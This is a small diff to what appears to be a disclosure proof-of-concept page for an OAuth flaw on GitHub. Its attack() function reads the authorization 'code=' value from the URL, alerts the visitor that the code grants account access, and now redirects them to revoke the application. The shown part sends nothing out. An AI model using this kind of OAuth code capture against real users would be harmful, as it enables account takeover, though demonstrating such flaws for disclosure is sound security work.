@@ -17,7 +17,8 @@ function attack(){
 
 if(location.href.indexOf('code=') != -1){
   code = location.href.substring(location.href.indexOf('code='));
-  alert("Now we have "+code+" that we can use to get access_token and access your account. By the way, audit your https://github.com/settings/applications")
+  alert("Now we have "+code+" that we can use to get access_token and access your account. Revoke it now. ");
+  location = 'https://github.com/settings/applications';
 }
 
 </script>
